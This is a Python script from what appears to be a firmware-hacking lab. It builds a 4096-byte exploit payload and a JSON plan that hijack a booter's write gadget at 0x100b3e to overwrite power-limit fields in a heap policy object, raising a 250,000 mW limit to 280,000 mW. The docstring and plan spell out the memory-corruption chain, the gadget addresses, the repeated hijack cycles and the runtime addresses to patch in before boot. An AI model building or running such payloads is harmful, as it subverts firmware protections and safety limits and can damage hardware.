#!/usr/bin/env python3
"""
4.44 TÂCHE C1 — the transfer-list BUILDER v444: the {value, target}
entries of TÂCHE B laid into the signature-memdesc image (4096 B),
byte-exact, the C dump == this builder (v442f method).

THE CHAIN THE PAYLOAD DRIVES (TÂCHE B2, the bytes-honest design):
  - ONE gadget-mode invocation (entry 0x100b3e) = write #1 at [a1-reg]
    then the CONSECUTIVE scatter [ctx.dest + slot*8] (the slot
    advancing from the crafted ctx +0x488) — the consecutive-u64
    property is inherent (the slot +1 per iteration, the wrap to 1).
  - THE D-ARRAY ROUTE (the bases, ONE invocation): the D u64s live at
    obj+0x618+idx*0x10 = {0x618, 0x628, 0x638, 0x648} — relative to
    dest = obj+0x610 they are the ODD-aligned u64s {dest+8, dest+0x18,
    dest+0x28, dest+0x38} = the slots {1, 3, 5, 7} — reachable in ONE
    8-iteration invocation (a3=8, a1=dest+8, slot0=0) with the list
    [D0, D0, P, D1, P, D2, P, D3] (P = the {B,C}-array clobber
    placeholders = 0, NAMED: no reader of A/B/C in the 4.43 census,
    the recompute rewrites them from the events = self-healing; the
    slot-0 counter cell [dest] += 8 corrupts {B[0],C[0]} — same class).
  - THE f18 ROUTE (the records, PERSISTENT): record[idx].f18 at
    obj+0x18+idx*0x30 = {0x18, 0x48, 0x78, 0xA8} — spaced 0x30 = NOT
    consecutive: 4 SEPARATE a3=1 invocations, each with a1 = the
    resolved record address and the walk cell advanced to the next
    f18 entry. The a1-refresh between invocations = NOT constructible
    from the booter's own instructions (v444e: 0 work gadgets — the
    bounded negative) => the 4 writes = 4 hijack cycles (the pass-III
    spin = the named re-entry candidate, unproven).
  - THE RUNTIME PARAMETERS (the honest wall): obj (the heap address of
    the 0x6d0 policy object = *(state+0x4E98)) — the payload carries
    the PLACEHOLDER; the capture day fills it.

THE VALUES (v444d, computed — never guessed):
  percent reading : D = 0x0000000010B07600 (280,000,000 uW),
                    f18 = 0x0000000000000070 (112 = 100 x 28/25)
  permille reading: D = 0x0000000001AB3F00 (28,000,000),
                    f18 = 0x0000000000000460 (1120)
  the stock f18 value = INDECIDABLE-BY-BYTES today; the runbook U2
  experiment decides (the f18 += 1 readback: 252500 vs 250250 mW).

Output: lab/jalon411/v444_transfer_list_build.json +
        lab/jalon411/v444_payload.bin
"""
import hashlib
import json
import struct

MEMDESC_SIZE = 0x1000
SLOT = 8
CTX_SLOT0_OFF = 0x488
CTX_CAP_OFF = 0x490
CTX_DEST_OFF = 0x498
CTX_MAGIC_OFF = 0x4A0
LIST_OFF = 0x500
F18_LIST_OFF = LIST_OFF + 8 * 8      # 0x540 — after the 8-entry D list

LIMIT_MAX_MW_STOCK = 250000
LIMIT_MAX_MW_NEW = 280000

READINGS = {
    "percent": {"D_new": 280000000, "f18_new": 112,
                "note": "base in uW, f18 in % — the coherent reading"},
    "permille": {"D_new": 28000000, "f18_new": 1120,
                 "note": "the arithmetic alternative — the base unit "
                         "scale unknown"},
}


def enc_u64(v):
    return struct.pack("<Q", v & (1 << 64) - 1)


def d_list(reading):
    """the 8-entry D-scatter list: [D0, D0, P, D1, P, D2, P, D3]."""
    d = READINGS[reading]["D_new"]
    P = 0
    return [d, d, P, d, P, d, P, d]


def f18_list(reading):
    """the 4 f18 u64s (one per 0x30-stride record, one hijack each)."""
    f = READINGS[reading]["f18_new"]
    return [f, f, f, f]


def build_payload_444(reading="percent", dest=0, slot0=0, capacity=0x400):
    """the memdesc image 4096 B + the plan. dest = the RUNTIME
    parameter (obj+0x610) — 0 = the placeholder until the capture day."""
    assert reading in READINGS
    dl = d_list(reading)
    fl = f18_list(reading)
    img = bytearray(b"\xFF" * MEMDESC_SIZE)
    img[CTX_SLOT0_OFF:CTX_SLOT0_OFF + 8] = enc_u64(slot0)
    img[CTX_CAP_OFF:CTX_CAP_OFF + 8] = enc_u64(capacity)
    img[CTX_DEST_OFF:CTX_DEST_OFF + 8] = enc_u64(dest)
    img[CTX_MAGIC_OFF] = 0x08
    for k, v in enumerate(dl):
        img[LIST_OFF + 8 * k:LIST_OFF + 8 * k + 8] = enc_u64(v)
    for k, v in enumerate(fl):
        img[F18_LIST_OFF + 8 * k:F18_LIST_OFF + 8 * k + 8] = enc_u64(v)
    plan = {
        "reading": reading,
        "values": READINGS[reading],
        "ctx": {"slot0": slot0, "capacity": capacity,
                "dest": f"0x{dest:016x}" + (" (PLACEHOLDER — the runtime"
                                            " param obj+0x610)" if dest == 0
                                            else ""),
                "magic": 8},
        "d_list_offset": LIST_OFF,
        "d_list": [f"0x{v:016x}" for v in dl],
        "d_scatter_contract": {
            "entry": "0x100b3e (the gadget mode)",
            "a0": "~0 (the RAW path forever)",
            "a3": 8, "a7": 0,
            "a1": "dest+8 = obj+0x618 (D0 — write #1, the register)",
            "a4": "the payload base (the ctx at +0x488)",
            "sp+8": "&d_list[0] (the walk cell)",
            "writes": "D0@dest+8(x2), P@dest+0x10, D1@dest+0x18, "
                      "P@dest+0x20, D2@dest+0x28, P@dest+0x30, "
                      "D3@dest+0x38 — the slots 1..7 consecutive",
            "counter": "[dest] += 8 (the slot-0 cell = {B[0],C[0]} — "
                       "the named corruption)",
        },
        "f18_list_offset": F18_LIST_OFF,
        "f18_list": [f"0x{v:016x}" for v in fl],
        "f18_chain_contract": {
            "invocations": 4,
            "per_invocation": "a3=1, a1=obj+0x18+idx*0x30 (the runtime "
                              "param), the walk cell -> f18_list[idx]",
            "a1_refresh": "NOT constructible from the booter insns "
                          "(v444e: 0 work gadgets) -> 4 hijack cycles "
                          "(the re-entry = UNPROVEN)",
            "collateral": "record+0x1c (the u64 high half) = the field "
                          "the recompute ZEROes (0x143ff04) — clean",
            "persistence": "the recompute write set EXCLUDES f14/f18 "
                           "(v444c PROVEN) — the persistent route",
        },
        "runtime_parameters": {
            "obj": "*(state+0x4E98) — the heap address of the 0x6d0 "
                   "object; the capture-day input",
            "note": "the payload placeholders (dest=0) must be patched "
                    "with the resolved values BEFORE the boot",
        },
    }
    return bytes(img), plan


payload, plan = build_payload_444("percent", dest=0)
out = {
    "memdesc_size": MEMDESC_SIZE,
    "stride": SLOT,
    "payload_sha256": hashlib.sha256(payload).hexdigest(),
    "plan": plan,
    "gadget_addresses": {
        "write_primitive_entry": "0x100b3e",
        "full_loop_entry": "0x100aec",
        "write_insn": "0x100b48 (sd a5, 0x0(a1))",
    },
    "source_instruments": ["v444a_evaluator_full", "v444b_descriptors",
                           "v444c_recompute", "v444d_values_table",
                           "v444e_gadget_chain"],
}
with open("lab/jalon411/v444_transfer_list_build.json", "w") as f:
    json.dump(out, f, indent=2)
with open("lab/jalon411/v444_payload.bin", "wb") as f:
    f.write(payload)
print(f"[+] v444 payload 4096 B built (reading=percent), sha256 "
      f"{out['payload_sha256'][:16]}…")
print(f"[+] the D list @0x{LIST_OFF:x} (8 entries), the f18 list "
      f"@0x{F18_LIST_OFF:x} (4 entries), the ctx @0x488")
print("[+] wrote v444_transfer_list_build.json + v444_payload.bin")
